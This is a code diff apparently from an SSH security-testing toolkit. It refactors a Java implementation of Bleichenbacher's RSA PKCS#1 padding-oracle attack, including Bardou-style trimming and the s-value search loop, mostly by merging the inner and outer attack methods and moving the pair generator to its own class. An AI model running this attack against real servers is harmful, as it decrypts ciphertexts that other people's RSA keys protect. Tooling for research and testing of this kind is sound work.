@@ -10,6 +10,7 @@ package de.rub.nds.sshattacker.attacks.pkcs1;
 import de.rub.nds.modifiablevariable.util.ArrayConverter;
 import de.rub.nds.sshattacker.attacks.pkcs1.oracles.Pkcs1Oracle;
 import de.rub.nds.sshattacker.attacks.pkcs1.util.MathHelper;
+import de.rub.nds.sshattacker.attacks.pkcs1.util.TrimmerGenerator;
 import de.rub.nds.sshattacker.core.crypto.keys.CustomRsaPublicKey;
 import java.math.BigInteger;
 import java.security.InvalidKeyException;
@@ -59,14 +60,6 @@ public class Bleichenbacher extends Pkcs1Attack {
     }
 
     /**
-     * Calculates the floor division of two BigInteger numbers.
-     *
-     * @param a The BigInteger number to be divided.
-     * @param b The BigInteger number that is the divisor.
-     * @return The floor division of a by b as a BigInteger.
-     */
-
-    /**
      * Manipulates the ciphertext by performing the following steps: 1. Computes the exponentiated
      * value of s using the public exponent e and modulus n. 2. Converts the ciphertext array c to a
      * BigInteger cipher. 3. Multiplies cipher with exponentiated and stores the result in res. 4.
@@ -84,38 +77,6 @@ public class Bleichenbacher extends Pkcs1Attack {
         BigInteger res = cipher.multiply(exponentiated);
 
         return res.mod(n);
-    }
-
-    /**
-     * Searches the smallest suitable s-value for the BB-Attack
-     *
-     * @param lowerBound The smallest value where it makes sens to start searching
-     * @param ciphertext the ciphertext which should be checked against
-     * @param rsaPublicKey the public-key to the ciphertext, which should be used to encrypt
-     * @return the smallest s-value, which generates a valid PKCS#1 Ciphertext
-     */
-    private BigInteger find_smallest_s(
-            BigInteger lowerBound, byte[] ciphertext, CustomRsaPublicKey rsaPublicKey) {
-        return find_smallest_s(lowerBound, ciphertext, rsaPublicKey, null);
-    }
-
-    /**
-     * Searches for a valid s-value in a given range of possible s-values of a BB-Attack
-     *
-     * @param lowerBound the lower bound for the possible s-values
-     * @param upperBound the upper boud for the possible s-values
-     * @param previousS the last s which was found,
-     * @param ciphertext the ciphertext, for which the s-values should be found
-     * @param rsaPublicKey the public-key for which the s-values should be found
-     * @return
-     */
-    private BigInteger find_s_in_range(
-            BigInteger lowerBound,
-            BigInteger upperBound,
-            BigInteger previousS,
-            byte[] ciphertext,
-            CustomRsaPublicKey rsaPublicKey) {
-        return find_s_in_range(lowerBound, upperBound, previousS, ciphertext, rsaPublicKey, null);
     }
 
     /**
@@ -356,7 +317,7 @@ public class Bleichenbacher extends Pkcs1Attack {
         three_B_sub_one = three_B.subtract(BigInteger.ONE);
         three_B_plus_one = three_B.add(BigInteger.ONE);
 
-        byte[] encoded_inner_ciphertext = outerBleichenbacher(ciphertext, outerPublicKey, classic);
+        byte[] encoded_inner_ciphertext = Bleichenbacher(ciphertext, outerPublicKey, null, classic);
         byte[] innerCiphertext = pkcs1Decode(encoded_inner_ciphertext);
 
         B = big_two.pow(8 * (innerK - 2));
@@ -365,7 +326,7 @@ public class Bleichenbacher extends Pkcs1Attack {
         three_B_sub_one = three_B.subtract(BigInteger.ONE);
         three_B_plus_one = three_B.add(BigInteger.ONE);
 
-        return innerBleichenbacher(innerCiphertext, innerPublicKey, outerPublicKey, classic);
+        return Bleichenbacher(innerCiphertext, innerPublicKey, outerPublicKey, classic);
     }
 
     private List<Interval> trimM0(
@@ -373,11 +334,12 @@ public class Bleichenbacher extends Pkcs1Attack {
             CustomRsaPublicKey innerPublicKey,
             CustomRsaPublicKey outerPublicKey,
             int maxTrimmers) {
+        TrimmerGenerator trimmerGenerator = new TrimmerGenerator();
 
-        List<Interval> M = new ArrayList<>();
+        List<Interval> M;
 
-        ArrayList<int[]> trimmers = new ArrayList<>();
-        trimmers = getPaires(maxTrimmers);
+        ArrayList<int[]> trimmers;
+        trimmers = trimmerGenerator.getPaires(maxTrimmers);
         ArrayList<int[]> utPairs = new ArrayList<>();
 
         for (int[] ut : trimmers) {
@@ -461,7 +423,7 @@ public class Bleichenbacher extends Pkcs1Attack {
      * @param outerPublicKey The outer RSA public key.
      * @return The decrypted plaintext as a byte array.
      */
-    private byte[] innerBleichenbacher(
+    private byte[] Bleichenbacher(
             byte[] ciphertext,
             CustomRsaPublicKey innerPublicKey,
             CustomRsaPublicKey outerPublicKey,
@@ -488,8 +450,9 @@ public class Bleichenbacher extends Pkcs1Attack {
                 M.get(0).lower.toString(16),
                 M.get(0).upper.toString(16));
         if (!classic) {
+            int maxTrimmes = outerPublicKey != null ? 5000 : 1000;
 
-            M = trimM0(ciphertext, innerPublicKey, outerPublicKey, 5000);
+            M = trimM0(ciphertext, innerPublicKey, outerPublicKey, maxTrimmes);
         }
 
         s =
@@ -525,72 +488,6 @@ public class Bleichenbacher extends Pkcs1Attack {
     }
 
     /**
-     * The Bleichenbacher-Attacke for single-encrypted ciphertexts
-     *
-     * @param ciphertext The ciphertext, which should be decrypted
-     * @param publicKey The known public key, which was used to encrypt the ciphertext
-     * @return the decrypted ciphertext, whith a valid PKCS#1 Padding
-     */
-    private byte[] outerBleichenbacher(
-            byte[] ciphertext, CustomRsaPublicKey publicKey, boolean classic) {
-        MathHelper mathHelper = new MathHelper();
-        int bitsize = publicKey.getModulus().bitLength();
-        int k = bitsize / 8;
-
-        LOGGER.debug(
-                "bitsize: {}\nk: {}\nB: {}\n2B: {}\n3B: {}\n3B - 1: {}\nCiphertext: {}",
-                bitsize,
-                k,
-                B.toString(16),
-                two_B.toString(16),
-                three_B.toString(16),
-                three_B_sub_one.toString(16),
-                bytesToHex(ciphertext));
-
-        List<Interval> M = new ArrayList<>();
-        M.add(new Interval(two_B, three_B_sub_one));
-        LOGGER.debug(
-                "M lower: {} M upper: {}",
-                M.get(0).lower.toString(16),
-                M.get(0).upper.toString(16));
-
-        BigInteger s;
-
-        if (!classic) {
-            // Search for s1 with improved start-conditions from Bardou
-            M = trimM0(ciphertext, publicKey, null, 1000);
-        }
-
-        s =
-                find_smallest_s(
-                        mathHelper.ceil(publicKey.getModulus().add(two_B), M.get(0).upper),
-                        ciphertext,
-                        publicKey);
-
-        LOGGER.debug(
-                "found s, initial updating M lower: {} M upper: {}",
-                M.get(0).lower.toString(16),
-                M.get(0).upper.toString(16));
-
-        M = updateInterval(M, s, publicKey);
-        LOGGER.debug("Length: {} M: {}", M.size(), M.toString());
-
-        while (true) {
-            if (M.size() >= 2) {
-                s = find_smallest_s(s.add(BigInteger.ONE), ciphertext, publicKey);
-            } else if (M.size() == 1) {
-                BigInteger a = M.get(0).lower;
-                BigInteger b = M.get(0).upper;
-                if (a.equals(b)) {
-                    return ArrayConverter.bigIntegerToByteArray(a);
-                }
-                s = find_s_in_range(a, b, s, ciphertext, publicKey);
-            }
-            M = updateInterval(M, s, publicKey);
-        }
-    }
-
-    /**
      * A helper function to create a hex-string from bytes
      *
      * @param bytes The bytes, which should be returned as hex-string
@@ -602,60 +499,6 @@ public class Bleichenbacher extends Pkcs1Attack {
             result.append(String.format("%02x", b));
         }
         return result.toString();
-    }
-
-    private BigInteger[] ensureRange(BigInteger ucandidate, BigInteger tcandidate) {
-        float quotient = ucandidate.floatValue() / tcandidate.floatValue();
-
-        // if we get to big - choose next value for t, reset u to 1
-        if (quotient >= (3.0F / 2.0F)) {
-            ucandidate = BigInteger.valueOf(1);
-            tcandidate = tcandidate.add(BigInteger.ONE);
-            quotient = ucandidate.floatValue() / tcandidate.floatValue();
-        }
-        // test if wie are too small, add up u until we are above 2/3
-        while (quotient <= (2.0F / 3.0F)) {
-            ucandidate = ucandidate.add(BigInteger.ONE);
-            quotient = ucandidate.floatValue() / tcandidate.floatValue();
-        }
-
-        // return if the range is hold
-        return new BigInteger[] {ucandidate, tcandidate};
-    }
-
-    /**
-     * Retrieves u/t paires for improved bb attack as mentioned by Bardou 2012
-     *
-     * @param maxPairs the maximum number of pairs to retrieve
-     * @return an ArrayList of int arrays representing the pairs of integers
-     */
-    private ArrayList<int[]> getPaires(int maxPairs) {
-        ArrayList<int[]> paires = new ArrayList<>();
-        BigInteger u = BigInteger.valueOf(1);
-        BigInteger t = BigInteger.valueOf(2);
-
-        // as long as we are not above t < 2^12 and the max number of paires isn`t reached - go on
-        // searching
-        while ((t.compareTo(BigInteger.valueOf(2).pow(12)) < 0) && paires.size() < maxPairs) {
-            BigInteger[] result = ensureRange(u, t);
-            u = result[0];
-            t = result[1];
-
-            // while u and t are not coprime - add up u and test again
-            // every run test if we are in range, otherwise correct
-            while (u.gcd(t).compareTo(BigInteger.valueOf(1)) != 0) {
-                u = u.add(BigInteger.ONE);
-                BigInteger[] result2 = ensureRange(u, t);
-                u = result2[0];
-                t = result2[1];
-            }
-
-            // Pair found -> add to paires and add u one up
-            paires.add(new int[] {u.intValue(), t.intValue()});
-            u = u.add(BigInteger.ONE);
-        }
-
-        return paires;
     }
 
     /**
